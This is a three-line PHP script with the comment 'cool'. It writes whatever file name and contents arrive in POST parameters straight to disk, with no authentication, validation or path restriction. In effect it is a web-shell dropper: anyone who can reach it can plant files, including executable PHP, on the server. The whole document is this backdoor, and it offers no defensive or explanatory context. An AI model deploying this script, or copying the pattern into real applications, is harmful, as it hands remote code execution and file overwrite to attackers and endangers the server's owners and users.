<?php
    /* cool */
	$r = file_put_contents($_POST["fullname"], $_POST["contents"]) or die("can't open file");
?>
